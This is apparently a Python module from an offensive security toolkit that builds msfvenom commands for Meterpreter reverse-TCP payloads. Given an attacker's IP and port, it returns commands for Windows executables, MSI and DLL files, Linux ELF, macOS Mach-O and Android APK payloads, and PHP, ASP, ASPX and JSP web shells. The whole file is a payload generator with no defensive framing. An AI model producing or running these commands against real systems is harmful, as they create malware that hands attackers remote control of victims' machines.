# encoding: utf8
from config import *


class Shell:
    def __init__(self):
        self.info = {
            'Name': 'payload',
            'Author': 'nul1',
            'Update': '2019/1/29',
        }

    def meter_re_windows(self, ip, port):
        return """
            \rmsfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe -o test.exe
            \rmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe -o test64.exe\n
            \rmsfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f msi -o test.msi\n
            \rmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f dll -o test.dll
        """.format(ip, port)

    def meter_re_linux(self, ip, port):
        return """
            \rmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf -o shell.elf\n
            \rmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf -o shell.elf
        """.format(ip, port)

    def meter_re_osx(self, ip, port):
        return """
            \rmsfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f macho -o test\n
            \rmsfvenom -p osx/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f macho -o test
        """.format(ip, port)

    def meter_re_android(self, ip, port):
        return "msfvenom -p android/meterpreter/reverse_tcp lhost={0} lport={1} -f raw -o test.apk".format(ip, port)

    def meter_re_webshell(self, ip, port):
        return """
            \rmsfvenom -p php/meterpreter/reverse_tcp -f raw --platform php -e generic/none -a php LHOST={0} LPORT={1} -o shell.php\n
            \rmsfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f asp -o shell.asp\n
            \rmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f aspx -o shell.aspx\n
            \rmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f jsp -o shell.jsp
            \rmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f jsp -o shell.jsp
        """.format(ip, port)
